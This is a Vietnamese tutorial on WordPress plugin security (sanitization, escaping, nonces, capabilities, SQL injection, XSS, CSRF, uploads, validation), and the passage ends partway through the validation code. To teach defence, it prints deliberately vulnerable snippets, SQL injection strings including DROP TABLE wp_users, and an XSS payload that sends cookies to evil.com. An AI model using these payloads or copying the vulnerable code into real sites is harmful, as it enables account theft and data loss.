# Bảo mật Plugin WordPress

## Mục lục

1. [Nguyên tắc bảo mật trong Plugin](#1-nguyen-tac-bao-mat-trong-plugin)
2. [Sanitize Input](#2-sanitize-input)
3. [Escape Output](#3-escape-output)
4. [Nonces - Chống CSRF](#4-nonces---chong-csrf)
5. [Capability Checks](#5-capability-checks)
6. [SQL Injection Prevention](#6-sql-injection-prevention)
7. [XSS Prevention](#7-xss-prevention)
8. [CSRF Prevention](#8-csrf-prevention)
9. [File Upload Security](#9-file-upload-security)
10. [Data Validation](#10-data-validation)
11. [Code ví dụ cho từng loại bảo mật](#11-code-vi-du-cho-tung-loai-bao-mat)
12. [Best Practices](#12-best-practices)

---

## 1. Nguyên tắc bảo mật trong Plugin

### 3 Nguyên tắc vàng

```
1. KHÔNG BAO GIỜ tin tưởng dữ liệu từ người dùng
   - Tất cả input là nguy hiểm cho đến khi được làm sạch
   - $_GET, $_POST, $_REQUEST, $_COOKIE, $_SERVER, $_FILES
   - Form data, AJAX data, URL parameters, HTTP headers

2. LUÔN LUÔN:
   - Sanitize INPUT (khi nhận dữ liệu)
   - Validate DATA (kiểm tra hợp lệ)
   - Escape OUTPUT (khi hiển thị)

3. NGUYÊN TẮC TỐI THIỂU QUYỀN (Least Privilege):
   - Chỉ cấp quyền tối thiểu cần thiết
   - Kiểm tra quyền trước MỌI hành động
```

### Luồng xử lý dữ liệu an toàn

```
Người dùng nhập      Sanitize       Validate       Lưu DB
[Form Input] -----> [Làm sạch] ----> [Kiểm tra] ----> [Database]
                    remove tags      is_email?        prepare()
                    trim spaces      length OK?
                    escape chars     range OK?

Đọc từ DB           Escape           Hiển thị
[Database] -------> [Mã hóa] ------> [Browser]
                    esc_html()        An toàn
                    esc_attr()        Không bị XSS
                    esc_url()
```

### So sánh với Laravel

```
Laravel                          WordPress
Form Request + Validation  =>    Sanitize + Validate thủ công
CSRF Token (tự động)       =>    Nonces (thủ công)
Middleware (auth, etc.)    =>    current_user_can()
Eloquent (tự escape)       =>    $wpdb->prepare()
Blade {{ }} (tự escape)    =>    esc_html(), esc_attr()
{!! !!} (raw output)       =>    wp_kses_post()
```

---

## 2. Sanitize Input

### Toàn bộ hàm Sanitize của WordPress

```php
<?php
/**
 * SANITIZE = Làm sạch dữ liệu đầu vào.
 * Áp dụng NGAY KHI NHẬN dữ liệu từ người dùng.
 * Loại bỏ các ký tự nguy hiểm, định dạng lại dữ liệu.
 */

// === TEXT ===

// sanitize_text_field() - Làm sạch text 1 dòng
// Xóa: HTML tags, xuống dòng, tab, khoảng trắng thừa
$name = sanitize_text_field( $_POST['name'] );
// Input:  " <script>alert(1)</script>Nguyen Van A  "
// Output: "Nguyen Van A"

// sanitize_textarea_field() - Làm sạch text nhiều dòng
// Giống sanitize_text_field NHƯNG giữ lại xuống dòng (\n)
$bio = sanitize_textarea_field( $_POST['bio'] );
// Input:  "<b>Dong 1</b>\nDong 2<script>alert(1)</script>"
// Output: "Dong 1\nDong 2"

// sanitize_title() - Tạo slug
$slug = sanitize_title( 'Bai Viet Cua Toi!' );
// Output: "bai-viet-cua-toi"

// sanitize_key() - Tạo key an toàn (chỉ a-z, 0-9, -, _)
$key = sanitize_key( 'My Option Key!' );
// Output: "my_option_key"

// sanitize_html_class() - Làm sạch CSS class name
$class = sanitize_html_class( 'my-class <script>' );
// Output: "my-classscript"

// === EMAIL ===

// sanitize_email() - Chỉ giữ lại ký tự hợp lệ cho email
$email = sanitize_email( 'user<script>@example.com' );
// Output: "user@example.com"

// === URL ===

// sanitize_url() (WP 5.9+) hoặc esc_url_raw()
// Làm sạch URL để lưu vào database
$url = sanitize_url( 'https://example.com/page?foo=bar&baz=<script>' );

// esc_url_raw() - Làm sạch URL cho database (không encode &)
$url_db = esc_url_raw( $_POST['website'] );

// === SỐ ===

// absint() - Số nguyên dương tuyệt đối
$count = absint( $_POST['count'] );     // "-5" => 5, "abc" => 0
// intval() - Số nguyên (có thể âm)
$offset = intval( $_POST['offset'] );   // "-5" => -5
// floatval() - Số thực
$price = floatval( $_POST['price'] );   // "19.99abc" => 19.99

// === FILE ===

// sanitize_file_name() - Làm sạch tên file
$filename = sanitize_file_name( '../../../etc/passwd' );
// Output: "etc-passwd" (xóa ký tự traversal)

// sanitize_mime_type() - Làm sạch MIME type
$mime = sanitize_mime_type( $_FILES['file']['type'] );

// === HTML ===

// wp_strip_all_tags() - Xóa TẤT CẢ tags HTML
$text = wp_strip_all_tags( '<p>Hello <strong>World</strong></p>' );
// Output: "Hello World"

// wp_kses() - Chỉ cho phép các tags HTML cụ thể
$allowed = array(
    'a'      => array( 'href' => array(), 'title' => array() ),
    'strong' => array(),
    'em'     => array(),
    'br'     => array(),
);
$safe_html = wp_kses( $_POST['content'], $allowed );
// Xóa tất cả tags không có trong $allowed

// wp_kses_post() - Cho phép HTML an toàn như bài viết
// Bao gồm: p, a, img, h1-h6, ul, ol, li, strong, em, blockquote, v.v.
$content = wp_kses_post( $_POST['content'] );

// wp_kses_data() - Chỉ cho phép HTML trong attribute
// Rất hạn chế

// === MÀU SẮC ===

// sanitize_hex_color() - Kiểm tra và trả về mã màu hex
$color = sanitize_hex_color( $_POST['color'] );
// "#ff0000" => "#ff0000", "not-a-color" => null

// sanitize_hex_color_no_hash() - Không có dấu #
$color_no_hash = sanitize_hex_color_no_hash( $_POST['color'] );
```

---

## 3. Escape Output

### Toàn bộ hàm Escape của WordPress

```php
<?php
/**
 * ESCAPE = Mã hóa dữ liệu khi HIỂN THỊ.
 * Ngăn browser thực thi code độc hại.
 * Áp dụng NGAY TRƯỚC KHI echo/output.
 *
 * NGUYÊN TẮC: "Escape late" - Escape càng muộn càng tốt (ngay trước output)
 */

// === esc_html() - Escape cho nội dung HTML ===
// Chuyển đổi: < > & " ' thành HTML entities
// Dùng trong: text node, nội dung thẻ HTML

$user_name = '<script>alert("XSS")</script>';

// SAI - Bị XSS!
echo $user_name;
// Output: <script>alert("XSS")</script> => Browser thực thi script!

// ĐÚNG
echo esc_html( $user_name );
// Output: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
// Browser hiển thị text, KHÔNG thực thi script

// Ví dụ thực tế
echo '<p>Xin chào, ' . esc_html( $user_name ) . '</p>';
echo '<h1>' . esc_html( get_the_title() ) . '</h1>';

// === esc_attr() - Escape cho HTML attributes ===
// Dùng trong: value, title, alt, class, id, data-*

$value = '" onmouseover="alert(1)" data-x="';

// SAI
echo '<input value="' . $value . '">';
// Output: <input value="" onmouseover="alert(1)" data-x="">
// => Thêm event handler độc hại!

// ĐÚNG
echo '<input value="' . esc_attr( $value ) . '">';
// Output: <input value="&quot; onmouseover=&quot;alert(1)&quot; data-x=&quot;">
// => An toàn, hiển thị như text

// Ví dụ thực tế
echo '<input type="text" name="email" value="' . esc_attr( $email ) . '">';
echo '<div class="' . esc_attr( $css_class ) . '">';
echo '<a title="' . esc_attr( $tooltip ) . '">';
echo '<div data-id="' . esc_attr( $item_id ) . '">';

// === esc_url() - Escape cho URLs ===
// Kiểm tra protocol (chỉ cho phép http, https, ftp, mailto, tel, v.v.)
// Loại bỏ javascript:, data:, v.v.

$url = 'javascript:alert("XSS")';

// SAI
echo '<a href="' . $url . '">Click</a>';
// => Click sẽ thực thi JavaScript!

// ĐÚNG
echo '<a href="' . esc_url( $url ) . '">Click</a>';
// Output: <a href="">Click</a>
// => URL bị xóa vì protocol nguy hiểm

// Ví dụ thực tế
echo '<a href="' . esc_url( $link ) . '">Truy cập</a>';
echo '<img src="' . esc_url( $image_url ) . '">';
echo '<form action="' . esc_url( admin_url( 'admin-post.php' ) ) . '">';

// Cho phép protocols tùy chỉnh
echo esc_url( $url, array( 'http', 'https', 'tel', 'skype' ) );

// === esc_js() - Escape cho inline JavaScript ===
$message = "Hello 'World' \"Test\"";

echo '<script>alert("' . esc_js( $message ) . '")</script>';
// Output: <script>alert("Hello \'World\' \"Test\"")</script>

// Ví dụ thực tế
echo '<button onclick="alert(\'' . esc_js( $message ) . '\')">';

// === esc_textarea() - Escape cho nội dung textarea ===
$text = '<script>alert(1)</script>Hello';

echo '<textarea>' . esc_textarea( $text ) . '</textarea>';
// Nội dung hiển thị an toàn trong textarea

// === wp_kses_post() - Escape HTML như bài viết ===
// Cho phép HTML an toàn, xóa nguy hiểm
$content = wp_kses_post( $raw_html );
echo $content; // An toàn vì đã được lọc

// === wp_kses() - Escape HTML tùy chỉnh ===
$allowed_tags = array(
    'a'      => array( 'href' => true, 'title' => true, 'target' => true ),
    'strong' => array(),
    'em'     => array(),
    'p'      => array( 'class' => true ),
);
echo wp_kses( $html_content, $allowed_tags );
```

### Bảng tóm tắt: Khi nào dùng hàm nào?

```
+------------------+-----------------------------+------------------------+
| Ngữ cảnh        | Hàm escape                  | Ví dụ                  |
+------------------+-----------------------------+------------------------+
| Text trong HTML  | esc_html()                  | <p>TEXT</p>            |
| HTML attribute   | esc_attr()                  | <input value="ATTR">   |
| URL (href, src)  | esc_url()                   | <a href="URL">         |
| Inline JS        | esc_js()                    | onclick="FN('JS')"     |
| Textarea value   | esc_textarea()              | <textarea>TEXT</textarea>|
| Safe HTML        | wp_kses_post()              | Nội dung bài viết      |
| Custom HTML      | wp_kses($html, $allowed)    | HTML tùy chỉnh         |
| URL cho DB       | esc_url_raw()               | Lưu URL vào database   |
+------------------+-----------------------------+------------------------+
```

---

## 4. Nonces - Chống CSRF

```php
<?php
/**
 * NONCE = "Number used Once" (thực tế là hash string, không phải số)
 * Bảo vệ khỏi CSRF (Cross-Site Request Forgery).
 *
 * CSRF là gì?
 * Kẻ tấn công đưa nạn nhân click link/form gửi request đến site của bạn
 * Nonce chứng minh request đến từ trang của bạn, không phải từ site khác
 *
 * So sánh với Laravel:
 * Laravel: @csrf trong Blade => tự động sinh _token
 * WordPress: wp_nonce_field() => thủ công thêm vào form
 */

// === TRONG FORM ===

// TẠO nonce cho form
function render_my_form() {
    ?>
    <form method="post" action="">
        <?php
        /**
         * wp_nonce_field() - Tạo hidden input chứa nonce
         *
         * @param string $action   Hành động (bất kỳ chuỗi nào)
         * @param string $name     Tên trường hidden (mặc định: _wpnonce)
         * @param bool   $referer  Thêm referrer field (mặc định: true)
         * @param bool   $echo     Echo hay return (mặc định: true)
         */
        wp_nonce_field( 'my_form_save', 'my_form_nonce' );
        // Output: <input type="hidden" name="my_form_nonce" value="a1b2c3d4e5">
        //         <input type="hidden" name="_wp_http_referer" value="/wp-admin/...">
        ?>

        <input type="text" name="title" value="">
        <button type="submit">Lưu</button>
    </form>
    <?php
}

// KIỂM TRA nonce khi xử lý form
function handle_my_form() {
    if ( ! isset( $_POST['my_form_nonce'] ) ) {
        return;
    }

    /**
     * wp_verify_nonce() - Kiểm tra nonce có hợp lệ không
     *
     * @param string $nonce  Giá trị nonce từ form
     * @param string $action Hành động (phải khớp với wp_nonce_field)
     *
     * @return int|false
     *   1 = nonce dưới 12 giờ (mới)
     *   2 = nonce 12-24 giờ (cũ nhưng còn hợp lệ)
     *   false = không hợp lệ
     */
    if ( ! wp_verify_nonce( $_POST['my_form_nonce'], 'my_form_save' ) ) {
        wp_die( 'Xác thực bảo mật thất bại!' );
    }

    // Nonce hợp lệ, xử lý tiếp...
    $title = sanitize_text_field( $_POST['title'] );
}

// CÁCH NGẮN GỌN: check_admin_referer()
function handle_my_form_short() {
    /**
     * check_admin_referer() - Kiểm tra nonce + referer
     * Tự động die() nếu thất bại
     *
     * @param string $action    Hành động
     * @param string $query_arg Tên trường (mặc định: _wpnonce)
     */
    check_admin_referer( 'my_form_save', 'my_form_nonce' );
    // Nếu nonce sai => Tự động hiện trang lỗi 403 và die()

    // Code xử lý chỉ chạy khi nonce đúng
}

// === TRONG URL ===

// TẠO URL có nonce
$delete_url = wp_nonce_url(
    admin_url( 'admin.php?page=my-plugin&action=delete&id=5' ),
    'delete_item_5'         // Action (nên bao gồm ID để duy nhất)
);
// URL: admin.php?page=my-plugin&action=delete&id=5&_wpnonce=a1b2c3

echo '<a href="' . esc_url( $delete_url ) . '">Xóa</a>';

// KIỂM TRA nonce từ URL
if ( isset( $_GET['action'] ) && $_GET['action'] === 'delete' ) {
    $id = absint( $_GET['id'] );
    check_admin_referer( 'delete_item_' . $id );
    // Xử lý xóa...
}

// === TRONG AJAX ===

// PHP: Tạo nonce và gửi sang JS
wp_localize_script( 'my-script', 'myData', array(
    'nonce' => wp_create_nonce( 'my_ajax_action' ),
));

// JS: Gửi nonce kèm AJAX
// $.post(ajaxUrl, { action: 'my_action', nonce: myData.nonce, ... });

// PHP: Kiểm tra nonce từ AJAX
add_action( 'wp_ajax_my_action', function() {
    check_ajax_referer( 'my_ajax_action', 'nonce' );
    // Xử lý...
    wp_send_json_success();
});
```

---

## 5. Capability Checks

```php
<?php
/**
 * CAPABILITY CHECK = Kiểm tra quyền của người dùng
 * Đảm bảo người dùng có quyền thực hiện hành động.
 *
 * Phải kiểm tra quyền TRƯỚC mọi hành động quan trọng.
 *
 * So sánh với Laravel:
 * Laravel: Gate::allows(), @can, Policy
 * WordPress: current_user_can()
 */

// === current_user_can() ===

/**
 * current_user_can() - Kiểm tra người dùng hiện tại có quyền không
 *
 * @param string $capability  Tên quyền
 * @param mixed  ...$args     Tham số thêm (ví dụ: post_id)
 * @return bool
 */

// Kiểm tra trước khi làm bất kỳ gì
function my_admin_action() {
    // Quyền quản trị toàn bộ
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'Bạn không có quyền thực hiện hành động này.' );
    }
    // Xử lý...
}

// === CÁC QUYỀN THƯỜNG DÙNG ===

// --- Quyền liên quan Posts ---
current_user_can( 'edit_posts' );          // Sửa bài viết của mình
current_user_can( 'edit_others_posts' );   // Sửa bài của người khác
current_user_can( 'publish_posts' );       // Xuất bản bài viết
current_user_can( 'delete_posts' );        // Xóa bài viết
current_user_can( 'edit_post', $post_id ); // Sửa 1 bài cụ thể

// --- Quyền liên quan Pages ---
current_user_can( 'edit_pages' );
current_user_can( 'publish_pages' );

// --- Quyền quản trị ---
current_user_can( 'manage_options' );      // Quản lý cài đặt (Admin)
current_user_can( 'activate_plugins' );    // Kích hoạt plugin
current_user_can( 'edit_theme_options' );  // Tùy chỉnh theme
current_user_can( 'manage_categories' );   // Quản lý danh mục
current_user_can( 'moderate_comments' );   // Quản lý bình luận
current_user_can( 'upload_files' );        // Upload file
current_user_can( 'install_plugins' );     // Cài plugin mới
current_user_can( 'create_users' );        // Tạo user mới

// --- Quyền người dùng ---
current_user_can( 'read' );                // Đọc nội dung (tất cả user)
current_user_can( 'edit_user', $user_id ); // Sửa user cụ thể

// === ROLES VÀ CAPABILITIES ===

// Roles mặc định và quyền của chúng:
// Administrator: Toàn quyền
// Editor:        edit_others_posts, publish_posts, manage_categories, moderate_comments
// Author:        edit_posts (của mình), publish_posts, upload_files
// Contributor:   edit_posts (của mình), KHÔNG publish
// Subscriber:    read

// === TẠO CUSTOM CAPABILITY ===

// Thêm custom capability khi activate
register_activation_hook( __FILE__, function() {
    // Thêm quyền mới cho admin
    $admin = get_role( 'administrator' );
    if ( $admin ) {
        $admin->add_cap( 'manage_my_plugin' );
        $admin->add_cap( 'edit_my_plugin_items' );
        $admin->add_cap( 'delete_my_plugin_items' );
    }

    // Thêm quyền cho editor
    $editor = get_role( 'editor' );
    if ( $editor ) {
        $editor->add_cap( 'edit_my_plugin_items' );
    }
});

// Xóa custom capability khi uninstall
// Trong uninstall.php:
// $admin = get_role( 'administrator' );
// $admin->remove_cap( 'manage_my_plugin' );

// Sử dụng custom capability
if ( current_user_can( 'manage_my_plugin' ) ) {
    // Admin có thể truy cập
}

if ( current_user_can( 'edit_my_plugin_items' ) ) {
    // Admin và Editor có thể truy cập
}

// === VÍ DỤ THỰC TẾ ===

// Trong menu: ẩn menu nếu không có quyền
add_action( 'admin_menu', function() {
    add_menu_page(
        'My Plugin',
        'My Plugin',
        'manage_my_plugin',     // <-- CHỈ USER CÓ QUYỀN NÀY MỚI THẤY MENU
        'my-plugin',
        'my_plugin_page'
    );
});

// Trong AJAX
add_action( 'wp_ajax_delete_item', function() {
    check_ajax_referer( 'my_nonce', 'nonce' );

    // Kiểm tra quyền cụ thể
    if ( ! current_user_can( 'delete_my_plugin_items' ) ) {
        wp_send_json_error( array( 'message' => 'Không có quyền xóa.' ), 403 );
    }

    // Xử lý xóa...
    wp_send_json_success();
});

// Trong REST API
register_rest_route( 'my/v1', '/items', array(
    'methods'  => 'DELETE',
    'callback' => 'handle_delete',
    'permission_callback' => function() {
        return current_user_can( 'delete_my_plugin_items' );
    },
));
```

---

## 6. SQL Injection Prevention

```php
<?php
/**
 * SQL INJECTION là gì?
 * Kẻ tấn công chèn code SQL vào input để đọc/sửa/xóa database.
 *
 * Ví dụ:
 * Input: ' OR 1=1 --
 * Query: SELECT * FROM users WHERE email = '' OR 1=1 --'
 * Kết quả: Lấy TOÀN BỘ users!
 */

global $wpdb;
$table = $wpdb->prefix . 'my_items';

// ============================================
// SAI - DỄ BỊ SQL INJECTION!
// ============================================

// Trường hợp 1: Nối trực tiếp biến vào query
$id = $_GET['id']; // Giả sử: "1 OR 1=1"
$result = $wpdb->get_row( "SELECT * FROM {$table} WHERE id = {$id}" );
// Query: SELECT * FROM wp_my_items WHERE id = 1 OR 1=1
// => Lấy tất cả rows!

// Trường hợp 2: Nối chuỗi
$email = $_POST['email']; // Giả sử: "'; DROP TABLE wp_users; --"
$wpdb->query( "DELETE FROM {$table} WHERE email = '{$email}'" );
// Query: DELETE FROM wp_my_items WHERE email = ''; DROP TABLE wp_users; --'
// => XÓA BẢNG USERS!

// Trường hợp 3: LIKE injection
$search = $_GET['s']; // Giả sử: "%"
$wpdb->get_results( "SELECT * FROM {$table} WHERE name LIKE '%{$search}%'" );
// => Lấy tất cả dữ liệu!

// ============================================
// ĐÚNG - AN TOÀN!
// ============================================

// Cách 1: $wpdb->prepare() (BẮT BUỘC cho mọi query có biến)
$id = absint( $_GET['id'] );
$result = $wpdb->get_row(
    $wpdb->prepare( "SELECT * FROM {$table} WHERE id = %d", $id )
);
// %d tự động chuyển sang integer, không thể inject

$email = sanitize_email( $_POST['email'] );
$wpdb->query(
    $wpdb->prepare( "DELETE FROM {$table} WHERE email = %s", $email )
);
// %s tự động escape quotes

// Cách 2: LIKE với esc_like()
$search = sanitize_text_field( $_GET['s'] );
$like = '%' . $wpdb->esc_like( $search ) . '%';
$results = $wpdb->get_results(
    $wpdb->prepare( "SELECT * FROM {$table} WHERE name LIKE %s", $like )
);
// esc_like() escape: %, _, \ trong giá trị LIKE

// Cách 3: IN clause an toàn
$ids = array_map( 'absint', (array) $_POST['ids'] );
if ( ! empty( $ids ) ) {
    $placeholders = implode( ', ', array_fill( 0, count( $ids ), '%d' ) );
    $results = $wpdb->get_results(
        $wpdb->prepare(
            "SELECT * FROM {$table} WHERE id IN ({$placeholders})",
            ...$ids
        )
    );
}

// Cách 4: Dùng $wpdb->insert(), update(), delete() (tự động escape)
$wpdb->insert(
    $table,
    array( 'name' => $name, 'email' => $email ),
    array( '%s', '%s' )
);
// Các hàm này tự động escape giá trị

// Cách 5: Whitelisting cho ORDER BY, tên cột
$allowed_columns = array( 'id', 'name', 'email', 'created_at' );
$orderby = in_array( $_GET['orderby'] ?? '', $allowed_columns )
    ? $_GET['orderby']
    : 'id'; // Mặc định an toàn

$allowed_orders = array( 'ASC', 'DESC' );
$order = in_array( strtoupper( $_GET['order'] ?? '' ), $allowed_orders )
    ? strtoupper( $_GET['order'] )
    : 'DESC';

// An toàn vì orderby và order chỉ có thể là giá trị trong whitelist
$results = $wpdb->get_results(
    $wpdb->prepare(
        "SELECT * FROM {$table} ORDER BY {$orderby} {$order} LIMIT %d",
        10
    )
);
```

---

## 7. XSS Prevention

```php
<?php
/**
 * XSS (Cross-Site Scripting) là gì?
 * Kẻ tấn công chèn JavaScript vào trang web để:
 * - Đánh cắp cookie/session
 * - Redirect người dùng
 * - Thay đổi nội dung trang
 *
 * Phòng chống: LUÔN escape output
 */

// ============================================
// STORED XSS - Dữ liệu đọc từ database
// ============================================

// SAI - Bị XSS!
$user = $wpdb->get_row( "SELECT * FROM wp_users WHERE ID = 1" );
echo '<h1>Chào mừng, ' . $user->display_name . '</h1>';
// Nếu display_name = "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
// => Cookie bị đánh cắp!

// ĐÚNG
echo '<h1>Chào mừng, ' . esc_html( $user->display_name ) . '</h1>';

// ============================================
// REFLECTED XSS - Dữ liệu từ URL
// ============================================

// SAI
echo '<p>Kết quả tìm kiếm: ' . $_GET['s'] . '</p>';
// URL: ?s=<script>alert('XSS')</script>

// ĐÚNG
echo '<p>Kết quả tìm kiếm: ' . esc_html( sanitize_text_field( $_GET['s'] ) ) . '</p>';

// ============================================
// VÍ DỤ TỔNG HỢP
// ============================================

// Hiển thị dữ liệu trong HTML
echo '<div class="profile">';
echo '  <h2>' . esc_html( $user->name ) . '</h2>';
echo '  <p>' . esc_html( $user->bio ) . '</p>';
echo '  <a href="' . esc_url( $user->website ) . '">' . esc_html( $user->website ) . '</a>';
echo '</div>';

// Hiển thị dữ liệu trong attributes
echo '<input type="text" value="' . esc_attr( $value ) . '">';
echo '<div data-id="' . esc_attr( $item_id ) . '" title="' . esc_attr( $tooltip ) . '">';

// Hiển thị HTML cho phép (bài viết)
echo '<div class="content">';
echo wp_kses_post( $post_content ); // Lọc HTML nguy hiểm, giữ HTML an toàn
echo '</div>';

// JavaScript inline an toàn
$data = array( 'name' => $user->name, 'id' => $user->ID );
echo '<script>var userData = ' . wp_json_encode( $data ) . ';</script>';
// wp_json_encode tự động escape các ký tự nguy hiểm trong JSON
```

---

## 8. CSRF Prevention

```php
<?php
/**
 * CSRF (Cross-Site Request Forgery)
 * Kẻ tấn công lừa người dùng thực hiện hành động không mong muốn.
 *
 * Ví dụ tấn công:
 * Trang evil.com có form ẩn gửi POST đến yoursite.com/wp-admin/...
 * Nếu admin đang login và truy cập evil.com, form sẽ tự động gửi
 * và thực hiện hành động trên yoursite.com!
 *
 * Phòng chống: Dùng NONCE cho mọi form và action
 */

// === TRONG FORM: wp_nonce_field ===
function render_settings_form() {
    ?>
    <form method="post" action="">
        <?php wp_nonce_field( 'save_settings', '_settings_nonce' ); ?>
        <input type="text" name="option_value" value="">
        <button type="submit" name="save">Lưu</button>
    </form>
    <?php
}

function process_settings_form() {
    if ( ! isset( $_POST['save'] ) ) return;

    // Kiểm tra CSRF nonce
    if ( ! wp_verify_nonce( $_POST['_settings_nonce'] ?? '', 'save_settings' ) ) {
        wp_die( 'CSRF check thất bại! Request không hợp lệ.' );
    }

    // Kiểm tra quyền
    if ( ! current_user_can( 'manage_options' ) ) {
        wp_die( 'Không có quyền.' );
    }

    // An toàn để xử lý
    $value = sanitize_text_field( $_POST['option_value'] );
    update_option( 'my_option', $value );
}

// === TRONG URL: wp_nonce_url ===
$delete_link = wp_nonce_url(
    admin_url( 'admin.php?page=my-plugin&action=delete&id=' . $item_id ),
    'delete_item_' . $item_id,
    '_delete_nonce'
);
echo '<a href="' . esc_url( $delete_link ) . '"
       onclick="return confirm(\'Bạn có chắc muốn xóa?\')">Xóa</a>';

// Xử lý delete
if ( isset( $_GET['action'] ) && $_GET['action'] === 'delete' ) {
    $id = absint( $_GET['id'] );
    // Kiểm tra nonce (tự động die nếu sai)
    check_admin_referer( 'delete_item_' . $id, '_delete_nonce' );
    // An toàn để xóa
}

// === TRONG AJAX ===
// Tạo: wp_create_nonce('my_nonce') => gửi sang JS
// Kiểm tra: check_ajax_referer('my_nonce', 'security')

// === TRONG REST API ===
// Nonce: X-WP-Nonce header
// Tạo: wp_create_nonce('wp_rest')
// WordPress tự động kiểm tra khi dùng cookie auth
```

---

## 9. File Upload Security

```php
<?php
/**
 * Upload file an toàn trong WordPress plugin.
 * Cần kiểm tra: loại file, kích thước, tên file, quyền.
 */

function handle_secure_upload() {
    // 1. Kiểm tra quyền
    if ( ! current_user_can( 'upload_files' ) ) {
        wp_die( 'Không có quyền upload.' );
    }

    // 2. Kiểm tra nonce
    check_admin_referer( 'my_upload_action', 'upload_nonce' );

    // 3. Kiểm tra có file không
    if ( empty( $_FILES['my_file'] ) || $_FILES['my_file']['error'] !== UPLOAD_ERR_OK ) {
        wp_die( 'Không có file hoặc lỗi upload.' );
    }

    $file = $_FILES['my_file'];

    // 4. Kiểm tra kích thước (5MB max)
    $max_size = 5 * 1024 * 1024; // 5MB
    if ( $file['size'] > $max_size ) {
        wp_die( 'File quá lớn. Tối đa 5MB.' );
    }

    // 5. Kiểm tra loại file (MIME type)
    // QUAN TRỌNG: Không tin $_FILES['type'] - do client gửi, có thể giả mạo!
    $allowed_types = array(
        'image/jpeg' => 'jpg',
        'image/png'  => 'png',
        'image/gif'  => 'gif',
        'application/pdf' => 'pdf',
    );

    // Dùng wp_check_filetype để kiểm tra thực sự
    $file_info = wp_check_filetype( $file['name'], $allowed_types );

    if ( empty( $file_info['ext'] ) || empty( $file_info['type'] ) ) {
        wp_die( 'Loại file không được phép. Chỉ chấp nhận: JPG, PNG, GIF, PDF.' );
    }

    // 6. Kiểm tra nội dung file (double check)
    // Đối với hình ảnh, kiểm tra bằng getimagesize
    if ( strpos( $file_info['type'], 'image/' ) === 0 ) {
        $image_info = getimagesize( $file['tmp_name'] );
        if ( false === $image_info ) {
            wp_die( 'File không phải là hình ảnh hợp lệ.' );
        }
    }

    // 7. Làm sạch tên file
    $safe_filename = sanitize_file_name( $file['name'] );

    // 8. Sử dụng wp_handle_upload (cách an toàn nhất)
    // Hàm này tự động:
    // - Kiểm tra MIME type
    // - Di chuyển file vào thư mục uploads
    // - Tạo tên file duy nhất (tránh trùng)
    // - Trả về URL và đường dẫn

    // Phải include file này trước khi dùng wp_handle_upload
    if ( ! function_exists( 'wp_handle_upload' ) ) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
    }

    $upload_overrides = array(
        'test_form' => false,  // Không kiểm tra form (vì ta xử lý thủ công)
        'mimes'     => $allowed_types,  // Chỉ cho phép MIME types này
    );

    $result = wp_handle_upload( $file, $upload_overrides );

    if ( isset( $result['error'] ) ) {
        wp_die( 'Lỗi upload: ' . esc_html( $result['error'] ) );
    }

    // Thành công!
    // $result['file'] = /var/www/html/wp-content/uploads/2024/01/filename.jpg
    // $result['url']  = https://example.com/wp-content/uploads/2024/01/filename.jpg
    // $result['type'] = image/jpeg

    // 9. Tùy chọn: Thêm vào Media Library
    $attachment_id = wp_insert_attachment(
        array(
            'guid'           => $result['url'],
            'post_mime_type' => $result['type'],
            'post_title'     => pathinfo( $safe_filename, PATHINFO_FILENAME ),
            'post_content'   => '',
            'post_status'    => 'inherit',
        ),
        $result['file']
    );

    // Tạo metadata cho attachment (thumbnail, sizes)
    if ( ! function_exists( 'wp_generate_attachment_metadata' ) ) {
        require_once ABSPATH . 'wp-admin/includes/image.php';
    }
    $metadata = wp_generate_attachment_metadata( $attachment_id, $result['file'] );
    wp_update_attachment_metadata( $attachment_id, $metadata );

    return $attachment_id;
}

// Form upload
function render_upload_form() {
    ?>
    <form method="post" enctype="multipart/form-data">
        <?php wp_nonce_field( 'my_upload_action', 'upload_nonce' ); ?>
        <input type="file" name="my_file" accept=".jpg,.jpeg,.png,.gif,.pdf">
        <button type="submit">Upload</button>
    </form>
    <?php
}
```

---

## 10. Data Validation

```php
<?php
/**
 * VALIDATION = Kiểm tra dữ liệu có hợp lệ không.
 * Khác với Sanitize (làm sạch), Validate kiểm tra logic.
 *
 * Sanitize: Loại bỏ ký tự xấu => "abc<script>" -> "abc"
 * Validate: Kiểm tra đúng định dạng => "abc@" -> FALSE (không phải email)
 */

function validate_contact_form( array $data ): array {
    $errors = array();

    // === REQUIRED (bắt buộc) ===
    if ( empty( $data['name'] ) ) {
        $errors['name'] = 'Tên là bắt buộc.';
    }

    // === LENGTH (độ dài) ===
    if ( strlen( $data['name'] ) > 100 ) {
        $errors['name'] = 'Tên không được quá 100 ký tự.';
    }

    if ( strlen( $data['name'] ) < 2 ) {
        $errors['name'] = 'Tên phải có ít nhất 2 ký tự.';
    }

    // === EMAIL ===
    if ( empty( $data['email'] ) ) {
        $errors['email'] = 'Email là bắt buộc.';
    } elseif ( ! is_email( $data['email'] ) ) {
        // is_email() là hàm WordPress kiểm tra email hợp lệ
        $errors['email'] = 'Email không hợp lệ.';
    }

    // === URL ===
    if ( ! empty( $data['website'] ) ) {
        // wp_http_validate_url kiểm tra URL có thể truy cập
        if ( ! filter_var( $data['website'], FILTER_VALIDATE_URL ) ) {
            $errors['website'] = 'URL không hợp lệ.';
        }
    }

    // === SỐ (Range) ===
    if ( ! empty( $data['age'] ) ) {
        $age = intval( $data['age'] );
        if ( $age < 1 || $age > 150 ) {
            $errors['age'] = 'Tuổi phải từ 1 đến 150.';
        }
    }

    // === ENUM (Gia tri trong danh sach) ===
    $valid_statuses = array( 'active', 'inactive', 'pending' );
    if ( ! in_array( $data['status'], $valid_statuses, true ) ) {
        $errors['status'] = 'Trang thai khong hop le.';
    }

    // === PHONE ===
    if ( ! empty( $data['phone'] ) ) {
        // Chi cho phep so, dau +, dau -, khoang trang
        if ( ! preg_match( '/^[\d\+\-\s\(\)]{8,20}$/', $data['phone'] ) ) {
            $errors['phone'] = 'So dien thoai khong hop le.';
        }
    }

    // === DATE ===
    if ( ! empty( $data['birthday'] ) ) {
        $date = DateTime::createFromFormat( 'Y-m-d', $data['birthday'] );
        if ( ! $date || $date->format( 'Y-m-d' ) !== $data['birthday'] ) {
            $errors['birthday'] = 'Ngay sinh khong hop le (YYYY-MM-DD).';
        }
    }

    // === UNIQUE (kiem tra trung trong database) ===
    if ( ! empty( $data['email'] ) && empty( $errors['email'] ) ) {
        global $wpdb;
